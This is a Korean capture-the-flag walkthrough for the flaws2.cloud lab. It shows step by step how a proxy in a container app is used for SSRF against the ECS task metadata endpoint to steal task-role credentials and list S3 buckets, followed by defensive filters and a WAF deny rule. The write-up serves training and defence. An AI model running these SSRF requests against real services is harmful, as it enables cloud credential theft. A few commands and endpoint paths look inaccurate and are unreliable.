# Attacker Level 3 — ECS Task Metadata SSRF

> **URL**: http://container.target.flaws2.cloud/
> **핵심 기술**: ECS Fargate Task Metadata v2 (`169.254.170.2`) · SSRF
> **난이도**: ⭐⭐⭐
> **본인 AWS 계정 필요**: ❌

## 🎯 목표

이 레벨의 페이지는 **프록시** 기능을 가진 컨테이너 웹앱이다. flaws.cloud Level 5 와 구조가 비슷하지만 — 이번에는 **EC2 IMDS(`169.254.169.254`) 가 아니라 ECS Task Metadata(`169.254.170.2`)** 가 대상이다. Task Role 자격증명을 훔쳐 최종 플래그 페이지로 이동한다.

## 🧭 공식 힌트

<details>
<summary><b>Hint 1</b></summary>

> 이 앱은 **컨테이너** 안에서 돌고 있습니다. EC2 와 달리 자격증명이 `169.254.169.254` 에 있지 않습니다.

</details>

<details>
<summary><b>Hint 2</b></summary>

> ECS Task Metadata Endpoint 는 **`169.254.170.2`** 입니다. 환경변수 `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` 가 경로를 담고 있죠.

</details>

<details>
<summary><b>Hint 3</b></summary>

> 프록시로 그 환경변수가 무엇인지 먼저 알아내세요 — `/proc/self/environ` 이나 **ECS 메타데이터 엔드포인트 v4** 를 통해 가능합니다.

</details>

## 📚 사전 지식

- ECS 는 IMDS 대신 **Task metadata endpoint** 사용. Fargate 에서는 IMDS 자체가 없다.
- 자격증명 엔드포인트: `http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}`
- ECS Task Metadata v4: `${ECS_CONTAINER_METADATA_URI_V4}` 환경변수를 통해 컨테이너 설정·네트워크 정보까지 조회.
- 자세히는 [primer §5](../../docs/aws-security-primer.md#5-ecs-task-role-과-task-metadata-endpoint).

## 🔍 정찰

### 1. 프록시 동작 확인
```bash
curl -s "http://container.target.flaws2.cloud/proxy/http://flaws2.cloud/"
```
외부 페이지를 되가져오면 SSRF 후보 확정.

### 2. 컨테이너 환경변수 덤프
Linux 프로세스는 `/proc/self/environ` 에 자기 환경변수를 갖는다. 프록시로 **file:// 이 아니라** HTTP 로만 접근 가능하면, **ECS metadata v4** 로 우회 가능:
```bash
curl -s "http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v4/metadata"
```
응답에 `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` 경로가 종종 포함되거나, 컨테이너 설정·네트워크 정보 획득.

더 간단한 건:
```bash
curl -s "http://container.target.flaws2.cloud/proxy/http://169.254.170.2/"
```
루트 호출 시 일부 ECS 설정의 **AWS_CONTAINER_CREDENTIALS_RELATIVE_URI** 가 그대로 보이는 경우가 있다.

## 🧨 취약점 원리

- **169.254.0.0/16** 대역을 필터링하지 않은 프록시가 결정타.
- `169.254.170.2` 는 ECS Agent 가 각 컨테이너에 주입한 HTTP 엔드포인트. 컨테이너 내부 기준으론 "로컬호스트 같은 내부 IP".
- 이 엔드포인트의 경로 중 하나가 Task Role 자격증명 ASIA 키를 JSON 으로 돌려준다.

## 🛠 풀이

### 1. 자격증명 경로 추출 (환경변수)
```bash
curl -s "http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/$(uuidgen)" 2>/dev/null || true
# (경로 UUID 를 직접 모를 경우 아래 v4 로)
curl -s "http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v4/task/credentials" | jq
```
응답에 Task Role 자격증명:
```json
{
  "RoleArn": "arn:aws:iam::653711331788:role/level3",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-04-18T06:00:00Z"
}
```

### 2. 자격증명으로 S3 리스팅
```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
export AWS_DEFAULT_REGION=us-east-1

aws s3 ls
# level3-xxxx.flaws2.cloud
```

### 3. 최종 플래그 페이지
해당 레벨 버킷의 `index.html` 에 플래그 + "축하합니다" 메시지.

```bash
aws s3 ls s3://the-end-xxxx.flaws2.cloud/
# index.html
```

## 🚪 정답 & 완주

<details>
<summary>정답 펼치기</summary>

- 최종: **flaws2.cloud Attacker 완주**. Defender 트랙으로.
- 교훈: 컨테이너/Fargate 는 IMDS 가 없지만 **대응되는 metadata endpoint 가 있음**. 애플리케이션 레벨 SSRF 방어는 EC2 든 ECS 든 **같은 사설 IP 대역**을 모두 커버해야 한다.

</details>

## 🌍 실제 세계 사례

- 2020 년 여러 CTF 에서 동일 구조(SSRF → 169.254.170.2 → Task Role) 가 반복 등장.
- 컨테이너 웹 프록시·URL fetcher·웹훅 수신기 중 하나가 자주 원인.

## 🛡 방어 대책

### ① 애플리케이션에서 링크로컬/사설 IP 차단
```python
from ipaddress import ip_address

def is_public(host: str) -> bool:
    ip = ip_address(socket.gethostbyname(host))
    return ip.is_global  # 링크로컬·사설·루프백 모두 False
```
- 스킴: `http`, `https` 만 허용 (no `file`, `gopher`)
- DNS rebinding 방지: 한 번 해석한 IP 로만 실제 연결

### ② Fargate Task Role 최소권한
- S3 전체 리스팅은 **절대 기본값으로 주지 말 것**
- `Resource` 를 구체 버킷으로 제한

### ③ ECS Task Metadata 접근 제한 (컨테이너 런타임)
- 컨테이너 네트워크에서 `169.254.170.2/32` 로의 egress 를 iptables / security group 으로 제한할 수 있는 구간이 제한적이지만, **사이드카 프록시** 패턴으로 metadata 를 감싸는 방법이 있다 (예: `aws-sdk-credential-provider-proxy`).

### ④ GuardDuty
- `UnauthorizedAccess:EC2/MetadataDNSRebind` (EC2), ECS 쪽도 유사 시그니처.

### ⑤ 애플리케이션 WAF
프록시 엔드포인트 자체에 `Pattern: target_url =~ /169\.254\./` 를 Deny 규칙으로.

## ✅ 체크리스트

- [ ] 프록시로 `169.254.170.2` GET 성공
- [ ] Task Role 자격증명 `ASIA...` 탈취
- [ ] 탈취 키로 `aws s3 ls` 확인
- [ ] 본인 Fargate 태스크에서 SSRF 방지 필터 적용 실습

## ⏭ 다음

[← Attacker L2](level-02.md) · [Defender 트랙 시작 →](../defender/level-01.md)
